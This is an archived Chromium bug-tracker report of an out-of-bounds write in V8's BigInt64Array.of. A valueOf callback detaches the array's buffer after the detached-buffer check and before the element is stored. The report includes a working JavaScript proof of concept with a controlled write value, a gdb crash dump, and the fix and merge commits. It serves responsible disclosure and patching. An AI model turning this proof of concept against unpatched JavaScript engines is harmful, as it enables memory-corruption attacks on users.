# V8 OOB write BigInt64Array.of and BigInt64Array.from side effect neuter

| Field | Value |
|-------|-------|
| **Issue ID** | [40092033](https://issues.chromium.org/issues/40092033) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | bt...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2018-07-26 |
| **Bounty** | $5,000.00 |

## Description

Vulnerability Details
This appears to be a bug that was introduced after fixing 816961. I don't have permission to view the issue, but the regression test `regress-crbug-816961.js` covers all cases except the BigInt64Array codepath.

`TypedArrayOf`(builtins-typedarray.cc:1634) has a special case for BigInt64Arrays which is handled by `EmitBigTypedArrayElementStore` (code-stub-assembler.cc:8815).

(line numbers taken from 6.8.275.24)

1675 if (kind == BIGINT64_ELEMENTS || kind == BIGUINT64_ELEMENTS) {
1676    EmitBigTypedArrayElementStore(new_typed_array, elements,
1677    intptr_index, item, context,
1678    &if_neutered);

`EmitBigTypedArrayElementStore` checks to see if the BigInt64Array is neutered and if so bails out. The check happens before `ToBigInt` which triggers callbacks.

 8815 void CodeStubAssembler::EmitBigTypedArrayElementStore(
 8816     TNode<JSTypedArray> object, TNode<FixedTypedArrayBase> elements,
 8817     TNode<IntPtrT> intptr_key, TNode<Object> value, TNode<Context> context,
 8818     Label* opt_if_neutered) {
 8819   if (opt_if_neutered != nullptr) { <----- Check for neuter
 8820     // Check if buffer has been neutered.
 8821     Node* buffer = LoadObjectField(object, JSArrayBufferView::kBufferOffset);
 8822     GotoIf(IsDetachedBuffer(buffer), opt_if_neutered);
 8823   }
 8824
 8825   TNode<BigInt> bigint_value = ToBigInt(context, value); <------- Callbacks are triggered (neuter)
 8826   TNode<RawPtrT> backing_store = LoadFixedTypedArrayBackingStore(elements);
 8827   TNode<IntPtrT> offset = ElementOffsetFromIndex(intptr_key, BIGINT64_ELEMENTS,
 8828                                                  INTPTR_PARAMETERS, 0);
 8829   EmitBigTypedArrayElementStore(elements, backing_store, offset, bigint_value);
 8830 }


Version
V8  6.8.275.24


Reproduction case

I've used %ArrayBufferNeuter and gc for simplicity

```
// Tested with
// gn args
//    is_debug=false
// EOF
// or x64.release
// flags: --allow-natives-syntax --expose-gc

var array = new BigInt64Array(11);

function evil_callback() {
  print("callback");
  %ArrayBufferNeuter(array.buffer);
  gc();
  return 71748523475265n - 16n; // rax: 0x41414141414141
}

var evil_object = {valueOf: evil_callback}

var root = BigInt64Array.of.call(
  function() { return array },
  evil_object
)

gc(); // trigger
```

$ ./out/x64.release/d8 --allow-native-syntax --expose-gc ./bigint-v8.js

```
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$rax   : 0x414141414131    
$rbx   : 0x55555619c0e0      →  0x00005555561434f0  →  0x0000000000000000
$rcx   : 0x0               
$rdx   : 0x2               
$rsp   : 0x7fffffffc5d0      →  0x0000555556187ef0  →  0x00005555560d6190  →  0x0000555555b56360  →  <v8::internal::MarkCompactCollector::~MarkCompactCollector()+0> push rbp
$rbp   : 0x7fffffffc600      →  0x00007fffffffc640  →  0x00007fffffffc750  →  0x00007fffffffc790  →  0x00007fffffffc800  →  0x00007fffffffc960  →  0x00007fffffffca40  → 0x00007fffffffca60
$rsi   : 0x1ff             
$rdi   : 0x1               
$rip   : 0x555555b9bffb      →  <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> mov QWORD PTR [rax+rdx*8], r14
$r8    : 0x55555619c130      →  0x0000000000000001
$r9    : 0x1               
$r10   : 0x7fffffffc5d0      →  0x0000555556187ef0  →  0x00005555560d6190  →  0x0000555555b56360  →  <v8::internal::MarkCompactCollector::~MarkCompactCollector()+0> push rbp
$r11   : 0x263816e8c028a0  
$r12   : 0x55555619c1f8      →  0x0000000000000000
$r13   : 0x0               
$r14   : 0x176c82000000      →  0x0000000000080000
$r15   : 0x55555619c130      →  0x0000000000000001
$eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$ss: 0x002b  $gs: 0x0000  $ds: 0x0000  $fs: 0x0000  $cs: 0x0033  $es: 0x0000  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffc5d0│+0x00: 0x0000555556187ef0  →  0x00005555560d6190  →  0x0000555555b56360  →  <v8::internal::MarkCompactCollector::~MarkCompactCollector()+0> push rbp         ← $rsp, $r10
0x00007fffffffc5d8│+0x08: 0x0000176c82000000  →  0x0000000000080000
0x00007fffffffc5e0│+0x10: 0x000055555619cfd0  →  0x0000000000000000
0x00007fffffffc5e8│+0x18: 0x0000000000000000
0x00007fffffffc5f0│+0x20: 0x0000176c82080000  →  0x0000000000080000
0x00007fffffffc5f8│+0x28: 0x000055555619cf40  →  0x00005555560d5cf8  →  0x0000555555b486f0  →  <v8::internal::PagedSpace::~PagedSpace()+0> push rbp
0x00007fffffffc600│+0x30: 0x00007fffffffc640  →  0x00007fffffffc750  →  0x00007fffffffc790  →  0x00007fffffffc800  →  0x00007fffffffc960  →  0x00007fffffffca40  →  0x00007fffffffca60  ← $rbp
0x00007fffffffc608│+0x38: 0x0000555555b638d8  →  <v8::internal::MarkCompactCollector::StartSweepSpace(v8::internal::PagedSpace*)+232> mov rbx, r14
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x555555b9bfed <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> shr    rcx, 0x9
   0x555555b9bff1 <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> mov    rax, QWORD PTR [rax+rcx*8]
   0x555555b9bff5 <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> and    edx, 0x1ff
 → 0x555555b9bffb <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> mov    QWORD PTR [rax+rdx*8], r14
   0x555555b9bfff <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> add    QWORD PTR [r12], 0x1
   0x555555b9c004 <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> mov    rdi, r15
   0x555555b9c007 <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> add    rsp, 0x8
   0x555555b9c00b <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> pop    rbx
   0x555555b9c00c <v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace,+0> pop    r12
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "d8", stopped, reason: SIGSEGV
[#1] Id 2, Name: "V8 WorkerThread", stopped, reason: SIGSEGV
[#2] Id 3, Name: "V8 WorkerThread", stopped, reason: SIGSEGV
[#3] Id 4, Name: "V8 WorkerThread", stopped, reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x555555b9bffb → Name: v8::internal::Sweeper::AddPage(v8::internal::AllocationSpace, v8::internal::Page*, v8::internal::Sweeper::AddPageMode)()
[#1] 0x555555b638d8 → Name: v8::internal::MarkCompactCollector::StartSweepSpace(v8::internal::PagedSpace*)()
[#2] 0x555555b596ca → Name: v8::internal::MarkCompactCollector::StartSweepSpaces()()
[#3] 0x555555b57848 → Name: v8::internal::MarkCompactCollector::CollectGarbage()()
[#4] 0x555555b3af52 → Name: v8::internal::Heap::MarkCompact()()
[#5] 0x555555b38e5c → Name: v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags)()
[#6] 0x555555b3767d → Name: v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)()
[#7] 0x555555b36399 → Name: v8::internal::Heap::CollectAllGarbage(int, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)()
[#8] 0x55555588677b → Name: v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo*)()
[#9] 0x555555885cb7 → Name: v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::inter
nal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArgum
ents)()
```

bigint-v8.js (tested with release version of V8 6.8.275.24)

## Attachments

- [bigint-v8.js](attachments/bigint-v8.js) (text/plain, 492 B)
- [gdb_output.txt](attachments/gdb_output.txt) (text/plain, 6.9 KB)
- [bigint-v8.js](attachments/bigint-v8_53265232.js) (text/plain, 484 B)

## Timeline

### bt...@gmail.com (2018-07-26)

[Comment Deleted]

### cl...@chromium.org (2018-07-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6463325102407680.

### mb...@chromium.org (2018-07-26)

[Empty comment from Monorail migration]

### mb...@chromium.org (2018-07-26)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript]

### bt...@gmail.com (2018-07-26)

Here is a testcase that crashes cleanly on the 7.0.0 release candidate x64.release. (Linux ubuntu 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux)

### cl...@chromium.org (2018-07-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6265474481127424.

### ti...@chromium.org (2018-07-27)

Assigning Jakob to take a look, since he fixed the bug mentioned in the report.

### mb...@chromium.org (2018-07-27)

I wasn't able to reproduce this, but tentatively assigning security flags based on the report.

### jk...@chromium.org (2018-07-27)

I can repro. Great find and great analysis!

This got broken in https://chromium-review.googlesource.com/c/v8/v8/+/1021083, where a refactoring moved the is-neutered check before the ToBigInt conversion, so M68 and M69 are affected and should receive a backmerge.

Fix: https://chromium-review.googlesource.com/c/v8/v8/+/1153553

### bt...@gmail.com (2018-07-27)

[Comment Deleted]

### bu...@chromium.org (2018-07-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/a24d5ad7879f47b545f7ec39ff0c48f98e4e736f

commit a24d5ad7879f47b545f7ec39ff0c48f98e4e736f
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Fri Jul 27 21:40:03 2018

[csa] Fix is-neutered check in EmitBigTypedArrayElementStore

The ToBigInt conversion can have side effects, so the check for
neutered-ness must happen afterwards.

Bug: chromium:867776
Change-Id: I6e550c77a284da4cf132c21a6c3b1ed8f34eedc9
Reviewed-on: https://chromium-review.googlesource.com/1153553
Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
Reviewed-by: Dan Elphick <delphick@chromium.org>
Cr-Commit-Position: refs/heads/master@{#54761}
[modify] https://crrev.com/a24d5ad7879f47b545f7ec39ff0c48f98e4e736f/src/code-stub-assembler.cc
[add] https://crrev.com/a24d5ad7879f47b545f7ec39ff0c48f98e4e736f/test/mjsunit/regress/regress-crbug-867776.js


### sh...@chromium.org (2018-07-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-07-30)

Testcase 6265474481127424 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6265474481127424.

### cl...@chromium.org (2018-07-30)

Testcase 6463325102407680 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6463325102407680.

### aa...@google.com (2018-07-30)

[Empty comment from Monorail migration]

### bt...@gmail.com (2018-07-30)

[Comment Deleted]

### bt...@gmail.com (2018-07-30)

[Comment Deleted]

### jk...@chromium.org (2018-07-30)

Thanks for checking. No further testcase/repro is needed. I don't know why ClusterFuzz failed to repro; locally it was easy enough.

Thanks for the report!

We have Canary coverage, so requesting merges.

### sh...@chromium.org (2018-07-30)

This bug requires manual review: Request affecting a post-stable build
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), kariahda@(iOS), bhthompson@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-07-30)

[Empty comment from Monorail migration]

### bt...@gmail.com (2018-07-30)

[Comment Deleted]

### bt...@gmail.com (2018-07-30)

[Comment Deleted]

### sh...@chromium.org (2018-07-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-31)

Your change meets the bar and is auto-approved for M69. Please go ahead and merge the CL to branch 3497 manually. Please contact milestone owner if you have questions.
Owners: amineer@(Android), kariahda@(iOS), cindyb@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-07-31)

Pls merge to M69 branch 3497 ASAP so we can pick it up for this week M69 Dev/Beta release. Thank you.

### ab...@google.com (2018-07-31)

Approving merge to M68 branch. Confirmed with Jakob, safe 2 line fix and has been in canary. 

### bu...@chromium.org (2018-07-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/7d47839dc062b69467f58c55aab7cc9abf78d687

commit 7d47839dc062b69467f58c55aab7cc9abf78d687
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Tue Jul 31 21:16:08 2018

Merged: [csa] Fix is-neutered check in EmitBigTypedArrayElementStore

Revision: a24d5ad7879f47b545f7ec39ff0c48f98e4e736f

BUG=chromium:867776
LOG=N
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=adamk@chromium.org

Change-Id: I6c89d0c5e360720a6d85187902b4da90e5c8017c
Reviewed-on: https://chromium-review.googlesource.com/1157070
Reviewed-by: Adam Klein <adamk@chromium.org>
Cr-Commit-Position: refs/branch-heads/6.9@{#19}
Cr-Branched-From: d7b61abe7b48928aed739f02bf7695732d359e7e-refs/heads/6.9.427@{#1}
Cr-Branched-From: b7e108d6016bf6b7de3a34e6d61cb522f5193460-refs/heads/master@{#54504}
[modify] https://crrev.com/7d47839dc062b69467f58c55aab7cc9abf78d687/src/code-stub-assembler.cc
[add] https://crrev.com/7d47839dc062b69467f58c55aab7cc9abf78d687/test/mjsunit/regress/regress-crbug-867776.js


### bu...@chromium.org (2018-07-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/ddbaf977f2836ee1d8be9e0faf5ad731fce3eda7

commit ddbaf977f2836ee1d8be9e0faf5ad731fce3eda7
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Tue Jul 31 21:19:43 2018

Merged: [csa] Fix is-neutered check in EmitBigTypedArrayElementStore

Revision: a24d5ad7879f47b545f7ec39ff0c48f98e4e736f

BUG=chromium:867776
LOG=N
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=adamk@chromium.org

Change-Id: I63a4165a950ece3ce1cc59ada05e6f4517625fa4
Reviewed-on: https://chromium-review.googlesource.com/1157259
Reviewed-by: Adam Klein <adamk@chromium.org>
Cr-Commit-Position: refs/branch-heads/6.8@{#50}
Cr-Branched-From: 44d7d7d6b1041b57644400a00cb3fee35f6c51b2-refs/heads/6.8.275@{#1}
Cr-Branched-From: 5754f66f75136dc17b4c63fec84f31dfdb89186e-refs/heads/master@{#53286}
[modify] https://crrev.com/ddbaf977f2836ee1d8be9e0faf5ad731fce3eda7/src/code-stub-assembler.cc
[add] https://crrev.com/ddbaf977f2836ee1d8be9e0faf5ad731fce3eda7/test/mjsunit/regress/regress-crbug-867776.js


### jk...@chromium.org (2018-07-31)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-08-06)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### bt...@gmail.com (2018-08-06)

Hey Andrew. Please double this up for charity :). 34% Amnesty International, 33% EFF, and 33% Against Malaria Foundation. If it isn't possible to split 100% to Amnesty International.

Thanks!

### aw...@chromium.org (2018-08-06)

Thanks for your generosity btiszka@! I'll be in touch with some more details.

### aw...@chromium.org (2018-08-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-08-06)

[Empty comment from Monorail migration]

### aw...@google.com (2018-08-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-09-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-06)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### of...@google.com (2018-12-13)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-01-04)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-05)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-05)

This issue was migrated from crbug.com/chromium/867776?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/867771]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092033)*
